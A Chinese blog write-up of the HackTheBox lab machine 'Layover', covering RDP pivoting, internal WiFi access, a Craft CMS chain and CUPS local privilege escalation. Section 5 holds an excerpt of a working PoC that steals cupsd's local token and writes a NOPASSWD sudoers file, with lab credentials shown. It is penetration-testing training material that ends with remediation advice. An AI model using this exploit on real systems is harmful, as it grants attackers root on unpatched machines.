---
title: "HTB Layover：从 RDP 跳板到 CUPS 本地提权"
date: 2026-11-10
categories: ["网络攻防"]
tags: ["HTB", "靶场", "Linux提权", "CUPS"]
description: "HTB Layover（Linux / Medium）实战记录：RDP 跳板机、内网 WiFi、Craft CMS 门户与 CUPS 2.4.16 本地提权"
draft: false
---

废话一下：打完湾区杯就去准备取证了，所以停更了一段时间，比赛还要继续进步吧

这段时间是想用htb的靶场，测测各个渗透智能体的性能对比一下，看看实战怎么样，强网被踢成路边了

Layover 是一台机场主题的中等难度 Linux 机器。攻击链分三段：先用题目提供的凭据 RDP 登入跳板机，接入内网 WiFi；再从门户侧拿到员工凭据，SSH 登录获取 user；最后利用本地 CUPS 的任意文件写漏洞提权到 root。

| 项目 | 内容 |
| --- | --- |
| 目标 | 10.129.247.82（Layover） |
| 系统 | Linux / Medium |
| 初始凭据 | `contractor / Contractor2026!` |
| 内网 | `10.13.37.0/24`（HTB International WiFi） |
| 关键漏洞 | CUPS 2.4.16 — CVE-2026-34990 |

## 0. 环境与准备

先确认目标可达。HTB 的机器每次重连 IP 都可能变化，以面板显示为准。

```bash
ping -c 2 10.129.247.82
```

值得单独说一句的是 VPN。本次使用的连接包是 UDP 1337，在当前网络下会被静默丢弃（`Server poll timeout`）。换成 **TCP 443** 连接包（把配置里的 `proto udp` 改成 `proto tcp`、`remote ... 1337` 改成 `443`）后正常建立隧道，本地获得 `10.10.16.245`，`10.129.0.0/16` 路由到 `10.10.16.1`。

## 1. 侦察

全端口扫描：

```bash
nmap -Pn -p- --min-rate 2000 -T4 10.129.247.82
```

结果非常干净，对外只有两个端口：

```text
PORT     STATE SERVICE
22/tcp   open  ssh
3389/tcp open  ms-wbt-server
```

没有 Web 服务，也没有 SMB/FTP。结合题目直接给出了 `contractor` 的凭据，入口大概率就在 RDP 上，而不是这些对外端口本身。

## 2. 入口：RDP 跳板机

### 2.1 SSH 是干扰项

先拿题目给的凭据试 SSH：

```bash
ssh contractor@10.129.247.82
# contractor@10.129.247.82: Permission denied (publickey,password).
```

我甚至把公钥写进了 `~/.ssh/authorized_keys`（权限 700/600，内容核对无误），服务端依然拒绝。说明 SSH 对 `contractor` 是刻意关闭的，这组凭据的实际用途是 RDP。

### 2.2 RDP 登入

```bash
xfreerdp /v:10.129.247.82 /u:contractor /p:'Contractor2026!' \
  /cert:ignore /size:1280x800 /kbd:layout:0x409
```

登录后是一台 XFCE 桌面的 `airside-ws01`，主机名和题目描述里的机场跳板机一致：

![1](../../htb/01-desktop.png)

## 3. 内网：接入 HTB International WiFi

跳板机有两个网络角色：`eth0` 是 10.159.143.0/24 的办公网，另外还有一块无线网卡 `wlan2`，初始处于 managed 但未关联状态。

```bash
$ ip -br addr
lo    UNKNOWN  127.0.0.1/8
eth0  UP       10.159.143.45/24

$ nmcli dev wifi list
IN-USE  BSSID              SSID                     MODE   CHAN  RATE      SIGNAL
        02:00:00:00:00:00  HTB International WiFi   Infra  6     54 Mbit/s 100
```

AP 是开放的。SSID 里有空格，直接用 BSSID 连接最省事：

```bash
nmcli device wifi connect 02:00:00:00:00:00
# Device 'wlan2' successfully activated with 'cb88104c-35c8-4f5c-933f-4c84c282ed80'

$ ip -4 addr show wlan2
6: wlan2: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 ...
    inet 10.13.37.182/24 brd 10.13.37.255 scope global dynamic noprefixroute wlan2

$ ping -c 2 10.13.37.10
64 bytes from 10.13.37.10: icmp_seq=1 ttl=64 time=0.322 ms
64 bytes from 10.13.37.10: icmp_seq=2 ttl=64 time=0.331 ms
```

连上后浏览器自动弹出 captive portal，页面提示员工门户在 `http://portal.international.htb/miles/`。这是一条重要线索：**门户只存在于这块 WiFi 的内网里**，从 VPN 侧直接访问 `10.13.37.0/24` 是打不通的（防火墙只放行同网段来源）。

> 顺带一提：本次实例里跳板机的 `wlan2` 并没有自动连上，需要手动接入；复现时先看 `iw dev` / `nmcli dev status` 再决定。

## 4. 用户层：从门户到 SSH

### 4.1 完整攻击链

按设计意图，这一段是：

1. `wlan3` 切监听模式，抓 802.11 明文流量，拿到员工 `jenny` 在门户登录时的 HTTP 表单凭据；
2. 用 `jenny` 登录 `portal.international.htb`，识别出 Craft CMS 5.9.8；
3. 利用认证后的 CVE-2026-44011（Yii 对象注入）拿到 www-data 的 shell；
4. 读 `/var/www/portal/.env` 里的 `CRAFT_SECURITY_KEY`，用它解密数据库里 `aporter` 的邮件中继密码；
5. 用 `aporter` SSH 到 `10.13.37.10`。

抓包与 RCE：

```bash
ssh -l aporter 10.13.37.10
# aporter@10.13.37.10's password: Skyp0rt_Relay!26
```

登录后发现主机名就叫 `portal`，说明门户 Web 和这个用户在同一台机器上：

```bash
$ cat user.txt; id; hostname
4ca84628cb82ea3a25faf927********
uid=1001(aporter) gid=1001(aporter) groups=1001(aporter)
portal
```

![2](../../htb/02-user-flag.png)

## 5. 权限提升：CUPS CVE-2026-34990

### 5.1 本地枚举

```bash
$ cups-config --version
2.4.16
$ ss -tln
LISTEN 0 4096 127.0.0.1:631  ...
```

CUPS 以 root 运行，版本 2.4.16 正好落在 CVE-2026-34990 的影响范围内（≤ 2.4.16）。

![3](../../htb/03-cups-enum.png)

常规项（SUID、cron、可写服务、`sudo -l`）都没有直接突破口，`aporter` 并不在 sudoers 里。

### 5.2 漏洞原理

这个漏洞的核心是「本地认证 token 泄露 + 任意文件写」，分三步：

1. **诱导认证**：创建一个 `device-uri` 指向攻击者 IPP 服务的临时打印机，cupsd 会主动回连这个地址；
2. **捕获 token**：假 IPP 服务返回 `401 Unauthorized` 并带上 `WWW-Authenticate: Local trc="y"`，cupsd 会用 `Authorization: Local <token>` 重试，token 到手；
3. **复用 token 写文件**：带着 token 调 `/admin/` 接口，把队列的 `device-uri` 设成 `file:///etc/sudoers.d/aporter-pwn`，再投递一个 `application/vnd.cups-raw` + `compression: gzip` 的打印任务。cupsd 解压后以 root 身份把内容原样写入目标文件。

关键请求片段（PoC 节选）：

```python
# 1) 假 IPP 服务返回 401，诱导 cupsd 带 token 重试
c.sendall(b"HTTP/1.1 401 Unauthorized\r\n"
          b"WWW-Authenticate: Local trc=\"y\"\r\n"
          b"Content-Length: 0\r\nConnection: close\r\n\r\n")

# 2) 用偷到的 token 创建 file:// 队列
ipp_post("/admin/", ipp_req(0x4003, 10,
    common_attrs() + [attr(0x45, "printer-uri", printer_uri)],
    [attr(0x45, "device-uri", f"file://{target}"),
     attr(0x42, "printer-name", name),
     attr(0x42, "ppd-name", "raw"),
     attr(0x22, "printer-is-temporary", b"\x00"),   # false -> 持久化
     attr(0x22, "printer-is-accepting-jobs", b"\x01"),
     attr(0x21, "printer-state", struct.pack(">i", 3))]), token=token)

# 3) gzip 的 raw 任务，被 cupsd 解压后以 root 写入文件
payload = gzip.compress(f"{USER} ALL=(ALL) NOPASSWD: ALL\n".encode())
ipp_post(f"/printers/{name}", ipp_req(0x0002, 13, [...], body=payload), token=token)
```

### 5.3 投递与执行

Portal 没有外网，PoC 通过 RDP 的磁盘重定向带进去：在本机用 `xfreerdp /drive:share,/path` 把目录挂进跳板机会话，再 `scp` 到 portal。

![4](../../htb/06-scp-transfer.png)

```bash
python3 /tmp/poc.py
```

一次成功：

```text
[*] CVE-2026-34990 | user=aporter | cupsd=127.0.0.1:631
[*] coercing cupsd -> rogue server ...
[+] captured token: 8497AD8D552F5251E667F3FEC779BB03
[*] writing sudoers ...
[+] wrote /etc/sudoers.d/aporter-pwn
[+] ROOT: uid=0(root) gid=0(root) groups=0(root)
[*] run: sudo -i
```

![5](../../htb/04-cups-poc.png)

读取 root flag：

```bash
$ sudo -n cat /root/root.txt
aa94e952b14a5fede9c8b8ce********
```

![6](../../htb/05-root-flag.png)

## 6. 收尾

这台机器考察的核心是「受限环境下的横向移动」：

- 入口不在对外端口上，而在题目给的凭据和 RDP 跳板机；
- 内网门户只存在于 WiFi 网段，从 VPN 侧不可达；
- 真正的提权点不是 SUID/cron，而是一个以 root 运行的本地服务 + 可写任意文件的 API。

修复建议也很直接：升级 CUPS 到 2.4.17+；对 `device-uri` 的 `file://` 协议做白名单；限制 `/admin/` 接口的本地认证复用。

## 附录：踩过的坑

**坑 0 · UDP 1337 被静默丢弃。**
预期：连接包直接可用。实际：`Server poll timeout`，UDP 出站正常（DNS 能通）但到边缘节点的 1337 无响应。结论：换 TCP 443 连接包。

**坑 1 · SSH 对 contractor 是干扰项。**
预期：既然开了 22，也许能用同一组凭据。实际：密码和公钥都被拒（手工写入 `authorized_keys` 也一样）。结论：这组凭据只用于 RDP。

**坑 2 · 跳板机回连不到攻击机。**
预期：直接反弹 shell 到 VPN 地址。实际：跳板机 ping `10.10.16.245` 100% 丢包，HTB 不给机器回程路由。结论：所有操作只能在 RDP 会话里完成，文件靠共享目录 + scp 搬运。

**坑 3 · RDP 自动化比想象中难。**
- Windows 主屏 150% 缩放时，`xdotool` 的坐标是逻辑坐标，窗口内点击会整体偏移；
- 键盘输入对 `>`、`|`、`&` 这类需要 Shift 的符号会中断，输入到一半就停；
- 剪贴板是异步同步的，刚设置的文本立刻粘贴会粘到上一次的内容；
- xfce4-terminal 对多行粘贴有「危险粘贴」拦截，需要手动确认：

![7](../../htb/07-paste-warning.png)

最后稳定的组合是：单行命令走剪贴板（无换行不弹窗）、`Ctrl+Shift+V` 粘贴、`Ctrl+J` 执行；文件走共享目录。

**坑 4 · PoC 与提权文件的清理。**
利用会在目标上留下 `/etc/sudoers.d/aporter-pwn`、临时打印队列和 `/tmp/poc.py`，测试完记得清理或直接重置机器。
